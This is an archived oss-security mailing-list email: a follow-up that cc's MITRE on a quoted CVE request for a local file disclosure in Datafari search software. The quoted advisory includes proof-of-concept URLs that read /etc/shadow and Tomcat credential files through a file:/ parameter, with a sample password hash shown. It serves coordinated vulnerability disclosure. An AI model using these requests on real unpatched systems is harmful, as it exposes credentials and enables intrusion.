X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2750" "Wednesday" "24" "February" "2016" "10:00:57" "-0500" "Fried Wil" "wilfried.pascault@gmail.com" "<CANTwUcqY-UXW+M-=urTkqtQLMQ5S6aG+kRKUdP02whyStXrQPQ@mail.gmail.com>" "88" "Re: [oss-security] CVE Request: Datafari Local File Disclosure" nil nil nil "2" "2016022415:00:57" "[oss-security] CVE Request: Datafari Local File Disclosure" (number mark "U       wilfried.pas Feb 24   88/2750  " thread-indent "\"Re: [oss-security] CVE Request: Datafari Local File Disclosure\"\n") "<A029BE905CDA9E49AF495A6ADB7F71A7D46E8CFB@SEATTLE.lexsi.lan>" ("<A029BE905CDA9E49AF495A6ADB7F71A7D46E8CFB@SEATTLE.lexsi.lan>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 9283 invoked by uid 550); 24 Feb 2016 15:02:19 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 7810 invoked from network); 24 Feb 2016 15:01:08 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20120113;
        h=mime-version:in-reply-to:references:date:message-id:subject:from:to
         :cc:content-type:content-transfer-encoding;
        bh=bV4yuIsW9avNZnDJWtcBcZeLDUUkuxJNQO4iDC/ZaFc=;
        b=bwGCBnGEPtwsiw3sJsYkOdueNyECdUO5AeLFGQoU1ZaiheOGxZagNrWUcIVMIRzOjt
         koPn+Ws4E2r99jju45wHL/t5cArBhIVgCdC1KZqoBKJERbUuLM4Ex9YidwqGNRZ6AtfV
         EM2Sv5mlbrM1FV47y8vu1/LPnsY6ls1og3q+40VTeNM4U7q54mlqyeHpbSwVW1eMYZVa
         2tEZIuwZQBEijSvaMI8aopSEqHsIaQmjJaO6sAWx4uWT/kEXbPDqRK5S1gj2vdqb8Gcx
         Toj57/C0fKWVamcPXke9r/b5rlMn89HiaZnZOt1kyXO5MugSvtEzRS6UMK6fuKMuzKq+
         YvTA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:mime-version:in-reply-to:references:date
         :message-id:subject:from:to:cc:content-type
         :content-transfer-encoding;
        bh=bV4yuIsW9avNZnDJWtcBcZeLDUUkuxJNQO4iDC/ZaFc=;
        b=hafp51hCAMf928XmgAiD4Rebwy29059r3jwgz9Xve9L4KCF9UJdi9fLThkAPGE9UYa
         9v1p5i1BAyBN+T9WnxdkuJXy/pqC0RS2fpyCHcW7FpK+BrMJPLlxJVBXL6UDgan1GuzX
         pqPVG7su/PJG5X2wWzglOz3BZHQz9Ue1VBKJmhkmHfzw8Fak2tyU2Wn+HCnEc4tJYwhQ
         Wa5dRoexDROF6dALZkLUhEc7rsy+5ipdIhvMCnCiTu5nUsjBMivV6AAe8s95KJ5E4Oma
         pSOCxf9utDjy0I72U+lrmW31Fi87lrQ25SMTjS9ter/zVFXokemjWFky0+G67wTMqX16
         pa/g==
X-Gm-Message-State: AG10YORKXkKuuIe3tbs6kDwbbIKXjAGZzpTMnKARePq3XFfHEtolQYLyFksHNvtzKSan6uHKEvbAbUCE+KF5hg==
MIME-Version: 1.0
X-Received: by 10.140.254.9 with SMTP id z9mr51573592qhc.5.1456326057128; Wed,
 24 Feb 2016 07:00:57 -0800 (PST)
In-Reply-To: <A029BE905CDA9E49AF495A6ADB7F71A7D46E8CFB@SEATTLE.lexsi.lan>
References: <A029BE905CDA9E49AF495A6ADB7F71A7D46E8CFB@SEATTLE.lexsi.lan>
Date: Wed, 24 Feb 2016 10:00:57 -0500
Message-ID: <CANTwUcqY-UXW+M-=urTkqtQLMQ5S6aG+kRKUdP02whyStXrQPQ@mail.gmail.com>
From: Fried Wil <wilfried.pascault@gmail.com>
To: oss-security@lists.openwall.com
Cc: CVE Assignments MITRE <cve-assign@mitre.org>
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: quoted-printable
Subject: Re: [oss-security] CVE Request: Datafari Local File Disclosure

Hi,

I forgot to add MITRE in cc for CVE assignment.

Thanks

On Wed, Feb 3, 2016 at 10:55 AM, PASCAULT Wilfried <wpascault@lexsi.com> wr=
ote:
> Datafari, an Open source enterprise search software using Apache Solr, Ma=
nifoldCF and Tomcat is proned to a local file disclosure vulnerability.
>
> Product's information
> ---------------------
> * Name : Datafari - http://www.datafari.com/
> * Editor: France Labs
> * Affected versions: 2.x<2.1.3
> * Tested : 2.1.0 and 2.1.1 on Debian Wheezy 7 and Jesse 8
>
> Description
> -----------
> When "filesystem" repository has been configured into Datafari (administr=
ative privileges on Datafari required), a user could access to any file of =
the system with root privileges.
>
> On "$INSTALLPATH$/datafari/tomcat/conf/datafari.properties" configuration=
 file, "ALLOWLOCALFILEREADING" parameter allows by default to read file on =
system.
>
> Datafari is by default running as user root, so any file could be downloa=
ded with "url=3Dfile:/" parameter in "/Datafari/URL" (token isn't checked).
>
> This issue is exploitable only when "Filesystem" repository has been set =
on ManifoldCF.
>
> Proof of concept
> ----------------
> http://localhost:8080/Datafari/URL?url=3Dfile:/arbitrary_file
>
> http://localhost:8080/Datafari/URL?url=3Dfile:/etc/shadow
> =3D> file will be downloaded as _etc_shadow
>
> $ head _etc_shadow
> root:$6$nTTh32TT$rLqcSGDf92tyh9aXtuTqnlGW4Ewr.IzBEcdP/kMnvhNYELz7iUgmOyiW=
esbJRUwEeKdKk/2yQcnAVBQYBGsiD.:16714:0:99999:7:::
> daemon:*:16714:0:99999:7:::
> bin:*:16714:0:99999:7:::
> sys:*:16714:0:99999:7:::
> sync:*:16714:0:99999:7:::
> games:*:16714:0:99999:7:::
> man:*:16714:0:99999:7:::
> lp:*:16714:0:99999:7:::
> mail:*:16714:0:99999:7:::
> news:*:16714:0:99999:7:::
>
> another funny file ^_^ (Tomcat manager password could not be changed duri=
ng installation)
> http://localhost:8080/Datafari/URL?url=3Dfile://opt/datafari/tomcat/conf/=
tomcat-users.xml
> $ cat _opt_datafari_tomcat_conf_tomcat-users.xml|grep admin
>   <user password=3D"@PASSWORD@" roles=3D"manager-gui,SearchAdministrator"=
 username=3D"admin"/>
>
> http://localhost:8080/manager/html/list
>
>
> Workaround
> ----------
> Set "ALLOWLOCALFILEREADING=3Dfalse" on "$INSTALLPATH$/datafari/tomcat/con=
f/datafari.properties" and restart Datafari
>
> Timeline
> --------
> 1/6/2016: reported to vendor
> 1/11/2016: vendor response but said was not a security issue
> 1/11/2016: add technical details and POC
> 1/11/2016: vendor acknowledged as a security issue
> 1/11/2016: patch was commited in master branch
> 1/28/2016: 2.1.3 released
>
> Thanks to C=C3=A9dric and Aur=C3=A9lien from Datafari project for their q=
uick replies.



--=20
Wilfried Pascault
+1 514 430 7201
wilfried.pascault@gmail.com
